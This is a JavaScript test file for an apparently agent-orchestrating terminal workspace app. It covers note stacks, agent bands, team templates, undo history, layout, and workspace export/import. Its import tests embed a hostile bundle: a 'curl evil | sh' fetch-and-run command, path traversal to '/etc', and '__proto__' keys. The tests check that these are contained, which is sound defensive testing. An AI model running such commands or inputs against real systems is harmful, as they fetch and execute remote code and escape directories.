import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { main } from '../src/server.js';
import { History } from '../src/history.js';
import { tidy } from '../src/layout.js';
import { exportWorkspace, importWorkspace } from '../src/transfer.js';

async function boot(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'om-str-'));
  const app = await main({ port: 0, dataRoot: path.join(dir, 'data'), socketPath: path.join(dir, 's.sock'), quiet: true });
  t.after(async () => { await app.close(); fs.rmSync(dir, { recursive: true, force: true }); });
  const ws = app.core.store.workspaces.get(app.core.store.settings.activeWorkspaceId);
  ws.dir = dir;
  return { app, ws, dir, core: app.core, store: app.core.store };
}
const rpc = (sock, id, cmd, args = {}) => new Promise((resolve, reject) => {
  const c = net.createConnection(sock);
  let buf = '';
  c.setEncoding('utf8');
  c.on('connect', () => c.write(JSON.stringify({ id: 1, ctx: { terminalId: id }, cmd, args }) + '\n'));
  c.on('data', (d) => { buf += d; if (buf.includes('\n')) { c.end(); resolve(JSON.parse(buf)); } });
  c.on('error', reject);
});
const term = (store, ws, name, extra = {}) => store.createNode(ws, 'terminal', { name, cwd: ws.dir, ...extra });

test('stacks: notes filed together are reachable through the stack and can be freed', async (t) => {
  const { app, ws, store } = await boot(t);
  const me = term(store, ws, 'Me');
  const call = (cmd, args) => rpc(app.socketPath, me.id, cmd, args);
  assert.equal((await call('note.create', { content: 'a', name: 'One', stack: 'Docs' })).ok, true);
  assert.equal((await call('note.create', { content: 'b', name: 'Two', stack: 'Docs' })).ok, true);
  const stack = ws.nodes.find((n) => n.kind === 'stack');
  assert.equal(stack.name, 'Docs');
  assert.deepEqual(stack.order.map((id) => ws.nodes.find((n) => n.id === id).name), ['One', 'Two']);
  // notes are reachable only via the stack cable
  assert.ok(store.neighbors(ws, me.id).some((n) => n.name === 'Two'));
  assert.equal(ws.connections.length, 1);
  assert.equal((await call('note.read', { name: 'Two' })).text, 'b');
  assert.equal((await call('note.unstack', { name: 'One' })).ok, true);
  assert.equal(ws.nodes.find((n) => n.name === 'One').stackId, undefined);
  assert.deepEqual(stack.order.length, 1);
  // deleting the stack with --stack removes its notes too
  const del = await call('note.delete', { stack: 'Docs' });
  assert.match(del.text, /1 note/);
  assert.ok(!ws.nodes.some((n) => n.name === 'Two'));
  assert.ok(ws.nodes.some((n) => n.name === 'One'), 'the freed note survives');
});

test('bands: members share connections; a cable to the band reaches every member', async (t) => {
  const { app, ws, store } = await boot(t);
  const boss = term(store, ws, 'Boss', { maestro: true });
  const a = term(store, ws, 'A');
  const b = term(store, ws, 'B');
  const outsider = term(store, ws, 'Outsider');
  const note = store.createNode(ws, 'note', { name: 'Shared' });
  const call = (cmd, args) => rpc(app.socketPath, boss.id, cmd, args);
  assert.equal((await call('band.create', { name: 'Crew', agents: ['A', 'B'], withoutMe: true })).ok, true);
  const band = ws.nodes.find((n) => n.kind === 'band');
  assert.deepEqual(new Set(band.members), new Set([a.id, b.id]));
  // A reaches B (fellow member) but not the outsider
  const reachA = store.neighbors(ws, a.id).map((n) => n.name);
  assert.ok(reachA.includes('B') && !reachA.includes('Outsider'));
  // wire the band to a note: both members reach it
  store.connect(ws, band.id, note.id);
  assert.ok(store.neighbors(ws, a.id).some((n) => n.name === 'Shared'));
  assert.ok(store.neighbors(ws, b.id).some((n) => n.name === 'Shared'));
  assert.ok(!store.neighbors(ws, outsider.id).some((n) => n.name === 'Shared'));
  // an agent can only be in one band
  const dup = await call('band.create', { name: 'Other', agents: ['A'], withoutMe: true });
  assert.equal(dup.ok, false);
  assert.match(dup.error, /already in band/);
  // the frame follows its members
  store.patchNode(ws, a.id, { x: 1000, y: 500 });
  assert.ok(band.x + band.w >= 1000 + a.w, 'band grew to include the moved member');
  assert.equal((await call('band.remove', { band: 'Crew', agent: 'B' })).ok, true);
  assert.equal((await call('band.dissolve', { band: 'Crew' })).ok, true);
  assert.ok(!ws.nodes.some((n) => n.kind === 'band'));
  assert.ok(ws.nodes.some((n) => n.name === 'A'), 'dissolving keeps the agents');
});

test('partitura: save a team, insert it again with its wiring and note text', async (t) => {
  const { app, ws, store, core } = await boot(t);
  const boss = term(store, ws, 'Boss', { maestro: true });
  const w1 = term(store, ws, 'Worker', { command: 'echo hi' });
  store.connect(ws, boss.id, w1.id);
  const note = store.createNode(ws, 'note', { name: 'Brief', text: 'the brief' });
  store.connect(ws, boss.id, note.id);
  const call = (cmd, args) => rpc(app.socketPath, boss.id, cmd, args);
  const saved = await call('partitura.create', { name: 'Duo', description: 'boss and worker' });
  assert.equal(saved.ok, true, saved.error);
  assert.equal((await call('partitura.create', { name: 'Duo' })).ok, false, 'duplicate name refused');
  assert.match((await call('partitura.list')).text, /Duo/);
  const before = ws.nodes.length;
  const ins = await call('partitura.insert', { name: 'Duo' });
  assert.equal(ins.ok, true, ins.error);
  assert.equal(ws.nodes.length, before + 3);
  const copies = ws.nodes.filter((n) => n.id !== boss.id && n.id !== w1.id && n.id !== note.id);
  assert.equal(copies.filter((n) => n.kind === 'terminal').length, 2);
  const copyNote = copies.find((n) => n.kind === 'note');
  assert.equal(store.readNote(ws.id, copyNote.id), 'the brief');
  // inserted agents are wired to the caller
  assert.ok(store.neighbors(ws, boss.id).filter((n) => n.kind === 'terminal').length >= 2);
  void core;
  assert.equal((await call('partitura.delete', { name: 'Duo' })).ok, true);
  assert.equal((await call('partitura.insert', { name: 'Duo' })).ok, false);
});

test('partitura without commands/note text does not carry them', async (t) => {
  const { app, ws, store } = await boot(t);
  const boss = term(store, ws, 'Boss', { maestro: true, command: 'rm -rf /tmp/nothing' });
  const note = store.createNode(ws, 'note', { name: 'Secret', text: 'api key here' });
  store.connect(ws, boss.id, note.id);
  const call = (cmd, args) => rpc(app.socketPath, boss.id, cmd, args);
  assert.equal((await call('partitura.create', { name: 'Lean', commands: false, noteText: false })).ok, true);
  const part = store.settings.partituras.find((p) => p.name === 'Lean');
  assert.equal(JSON.stringify(part).includes('rm -rf'), false);
  assert.equal(JSON.stringify(part).includes('api key'), false);
});

test('undo/redo restores structure, notes included, and folds drags into one step', async (t) => {
  const { ws, store, core } = await boot(t);
  const n = store.createNode(ws, 'note', { name: 'Keep', text: 'important text' });
  const tnode = term(store, ws, 'T');
  const startX = tnode.x;
  core.touch(ws);
  assert.equal(core.history.state(ws).canUndo, true);
  // a burst of drags = one undo step
  const t0 = Date.now();
  for (let i = 0; i < 20; i++) { store.patchNode(ws, tnode.id, { x: i * 5, y: i }); core.history.record(ws, t0 + i * 20); }
  store.deleteNode(ws, n.id);
  core.touch(ws);
  assert.ok(!ws.nodes.some((x) => x.id === n.id));
  assert.equal(core.undo(ws), true);
  assert.ok(ws.nodes.some((x) => x.id === n.id), 'note is back');
  assert.equal(store.readNote(ws.id, n.id), 'important text', 'its text came back from the trash');
  assert.equal(core.undo(ws), true);
  assert.equal(ws.nodes.find((x) => x.id === tnode.id).x, startX, 'the 20 drags were undone as one step');
  assert.equal(core.redo(ws), true);
  assert.equal(ws.nodes.find((x) => x.id === tnode.id).x, 95);
  // a new change clears redo
  store.createNode(ws, 'portal', { name: 'P' });
  core.touch(ws);
  assert.equal(core.redo(ws), false);
});

test('history limit is bounded', () => {
  const h = new History({ limit: 5 });
  const ws = { id: 'w', nodes: [], connections: [] };
  h.entry(ws);
  for (let i = 0; i < 20; i++) { ws.nodes.push({ id: String(i), kind: 'note', name: String(i), x: 0, y: 0, w: 1, h: 1 }); h.record(ws); }
  assert.ok(h.entry(ws).undo.length <= 5);
});

test('tidy lays agents out in columns left to right without overlaps', async (t) => {
  const { ws, store, core } = await boot(t);
  const boss = term(store, ws, 'Boss', { maestro: true, x: 900, y: 900 });
  const a = term(store, ws, 'A', { x: 5, y: 5 });
  const note = store.createNode(ws, 'note', { name: 'N', x: 5, y: 5 });
  store.connect(ws, boss.id, a.id);
  store.connect(ws, a.id, note.id);
  core.tidy(ws);
  const pos = (n) => ws.nodes.find((x) => x.id === n.id);
  assert.ok(pos(boss).x < pos(a).x && pos(a).x < pos(note).x, 'depth from the maestro decides the column');
  const boxes = ws.nodes.map((n) => [n.x, n.y, n.x + n.w, n.y + n.h]);
  for (let i = 0; i < boxes.length; i++) for (let j = i + 1; j < boxes.length; j++) {
    const [a1, b1, c1, d1] = boxes[i], [a2, b2, c2, d2] = boxes[j];
    assert.ok(c1 <= a2 || c2 <= a1 || d1 <= b2 || d2 <= b1, 'no overlap');
  }
  assert.ok(tidy(ws).size === 3);
});

test('export/import round trip keeps structure and never auto-runs imported commands', async (t) => {
  const { ws, store } = await boot(t);
  const boss = term(store, ws, 'Boss', { maestro: true, command: 'echo from-file' });
  const note = store.createNode(ws, 'note', { name: 'Doc', text: 'hello' });
  store.connect(ws, boss.id, note.id);
  const bundle = JSON.parse(JSON.stringify(exportWorkspace(store, ws)));
  const copy = importWorkspace(store, bundle, { name: 'Copy', dir: ws.dir });
  assert.notEqual(copy.id, ws.id);
  assert.equal(copy.nodes.length, 2);
  assert.equal(copy.connections.length, 1);
  const t2 = copy.nodes.find((n) => n.kind === 'terminal');
  assert.equal(t2.untrusted, true, 'the imported command is held back');
  assert.equal(store.readNote(copy.id, copy.nodes.find((n) => n.kind === 'note').id), 'hello');
  assert.ok(copy.nodes.every((n) => !ws.nodes.some((o) => o.id === n.id)), 'ids are regenerated');
});

test('importing a hostile bundle is contained', async (t) => {
  const { store, dir } = await boot(t);
  const evil = {
    format: 'openmaestri-workspace', version: 1,
    workspace: { name: 'x'.repeat(500) },
    nodes: [
      { key: '__proto__', kind: 'terminal', name: 'Evil', command: 'curl evil | sh', cwdRel: '../../etc', x: 'NaN', w: -5 },
      { key: 'k2', kind: 'constructor', name: 'bad kind' },
      { key: 'k3', kind: 'note', name: 'N', text: 'ok', id: '../../escape', stackKey: 'nope' },
      { key: 'k4', kind: 'terminal', name: 'Abs', cwdRel: '/etc' },
    ],
    connections: [{ from: '__proto__', to: 'k3' }, { from: 'nope', to: 'k3' }, null],
  };
  assert.throws(() => importWorkspace(store, evil, { dir }), /cannot be imported/, 'the closed format refuses this file as a whole');
  assert.equal(store.workspaces.size, 1, 'and creates nothing');
  // a file that obeys the format but is still hostile is contained by the second layer (clean copies, fresh ids, held-back commands)
  const sneaky = {
    format: 'openmaestri-workspace', version: 1,
    workspace: { name: 'x'.repeat(500) },
    nodes: [
      { key: '__proto__', kind: 'terminal', name: 'Evil', command: 'curl evil | sh', cwdRel: '../../etc', x: 1e9, w: -5 },
      { key: 'k3', kind: 'note', name: 'N', text: 'ok', stackKey: 'nope' },
      { key: 'k4', kind: 'terminal', name: 'Abs', cwdRel: '/etc' },
    ],
    connections: [{ from: '__proto__', to: 'k3' }, { from: 'nope', to: 'k3' }],
  };
  const ws = importWorkspace(store, sneaky, { dir });
  assert.ok(ws.name.length <= 80);
  assert.equal(ws.nodes.length, 3);
  for (const n of ws.nodes) assert.match(n.id, /^[0-9a-f-]{36}$/);
  for (const n of ws.nodes.filter((x) => x.kind === 'terminal')) {
    assert.ok(n.cwd.startsWith(dir), 'cwd never escapes the workspace dir');
    assert.ok(Number.isFinite(n.x) && n.w >= 160);
  }
  assert.equal(ws.nodes.find((n) => n.name === 'Evil').untrusted, true);
  assert.ok(!fs.existsSync(path.join(dir, '..', 'escape')));
  assert.throws(() => importWorkspace(store, { format: 'nope' }), /not an openmaestri workspace file/);
  assert.throws(() => importWorkspace(store, { format: 'openmaestri-workspace', version: 1, nodes: new Array(5000).fill({ kind: 'note' }) }), /too many nodes/);
  assert.throws(() => importWorkspace(store, { format: 'openmaestri-workspace', version: 1, nodes: [{ key: 'a', kind: 'note', text: 'x'.repeat((1 << 20) + 1) }] }), /too large/);
});

test('untrusted terminals start a plain shell, not the imported command', async (t) => {
  const { ws, store, core } = await boot(t);
  const marker = path.join(ws.dir, 'ran-imported-command');
  const node = term(store, ws, 'Held', { command: `touch ${marker}` });
  node.untrusted = true;
  core.startTerminal(ws, node);
  await new Promise((r) => setTimeout(r, 900));
  assert.equal(fs.existsSync(marker), false);
  node.untrusted = false;
  core.terminals.dispose(node.id);
  core.startTerminal(ws, node);
  const deadline = Date.now() + 8000;
  while (!fs.existsSync(marker) && Date.now() < deadline) await new Promise((r) => setTimeout(r, 100));
  assert.equal(fs.existsSync(marker), true, 'trusted command runs');
});

test('names that must be unique are refused, not silently renamed (bands, workspaces)', async (t) => {
  const { app, ws, store } = await boot(t);
  const boss = term(store, ws, 'Boss', { maestro: true });
  term(store, ws, 'A');
  term(store, ws, 'B');
  const call = (cmd, args) => rpc(app.socketPath, boss.id, cmd, args);
  assert.equal((await call('band.create', { name: 'Crew', agents: ['A'], withoutMe: true })).ok, true);
  const dup = await call('band.create', { name: 'crew', agents: ['B'], withoutMe: true });
  assert.equal(dup.ok, false);
  assert.match(dup.error, /a band named "crew" already exists/);
  assert.equal(ws.nodes.filter((n) => n.kind === 'band').length, 1);
  const dir = ws.dir;
  assert.equal((await call('workspace.create', { name: 'Second', dir })).ok, true);
  const again = await call('workspace.create', { name: 'second', dir });
  assert.equal(again.ok, false);
  assert.match(again.error, /a workspace named "second" already exists/);
});
